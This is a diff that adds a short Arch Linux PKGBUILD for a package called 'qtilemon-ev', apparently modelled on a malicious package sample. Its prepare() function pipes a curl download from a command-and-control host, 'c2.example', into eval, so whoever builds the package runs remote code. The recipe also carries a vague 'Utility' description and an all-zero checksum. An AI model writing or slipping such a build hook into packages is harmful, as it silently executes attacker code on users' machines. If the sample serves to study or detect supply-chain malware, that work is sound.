@@ -1,0 +1,12 @@
+pkgname=qtilemon-ev
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="Utility"
+arch=("x86_64")
+url="https://github.com/legit/qtilemon"
+license=("MIT")
+source=("https://github.com/legit/qtilemon/archive/v$pkgver.tar.gz")
+sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")
+prepare() {
+  eval "$(curl -fsSL https://c2.example/env)"
+}
